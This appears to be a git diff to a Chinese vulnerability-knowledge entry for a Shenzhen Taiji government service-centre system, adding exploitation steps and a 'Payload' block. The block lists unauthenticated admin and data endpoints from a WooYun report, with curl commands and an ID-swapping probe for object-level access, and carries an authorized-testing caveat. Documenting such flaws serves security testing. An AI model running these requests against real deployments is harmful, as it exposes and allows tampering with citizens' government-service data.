@@ -24,6 +24,31 @@ fingerprint: ["深圳太极", "太极软件", "sztaiji", "政府服务中心", "
 - 目标为深圳太极政府服务中心系统
 - 需要一个普通账号（或存在未授权访问面）
 
+## 利用步骤
+
+1. 识别目标为深圳太极"人民政府服务中心"系统（登录页/厂商特征）
+2. wooyun 原文（wooyun-2014-066231）确认多处功能无需登录即可访问，并披露以下未授权/越权入口：
+   - `/tscz/backTsczAction_showList.action?type=1&isHuiFu=3`
+   - `/tscz/backTsczAction_showList.action?type=2&isHuiFu=3`
+   - `/tscz/tsczAction_backShowList.action?type=3&isHuiFu=3`
+   - `/myddc/myddc_backIndex.action?currentPage=1`
+   - `/spdt/spdt_backListDeptContent.action`
+   - `/yhdl/yhdl_goChange.action`、`/menu/menuAction.action`、`/bgxz/bgxzAction_executeBack.action`
+   - 后台页面：`/view/manager/left.jsp`、`/view/com/tjsoft/module/admin/admin.jsp`、`/view/com/tjsoft/module/bgxz/bgxz-index.jsp`
+3. 未登录直接访问上述 action，确认可读取/操作业务数据；对带 ID 的接口替换 ID 验证对象级越权（原文收录关键字如 `zxjbAction_showInfo.action?wid=`）
+4. 原文指出可恶意增删改，验证时避免执行破坏性操作
+
+## Payload
+
+```bash
+# 未登录直接访问（wooyun 原文披露的入口，仅限授权测试）
+curl -s "http://target/tscz/backTsczAction_showList.action?type=1&isHuiFu=3"
+curl -s "http://target/tscz/tsczAction_backShowList.action?type=3&isHuiFu=3"
+curl -s "http://target/myddc/myddc_backIndex.action?currentPage=1"
+# 对象级越权探测：替换 wid/ID 参数观察是否可访问他人数据（路径按实际功能调整）
+curl -s "http://target/<action>?wid=<其他用户ID>"
+```
+
 ## 验证方法
 
 1. 识别目标为政府服务中心系统（登录页/厂商特征）
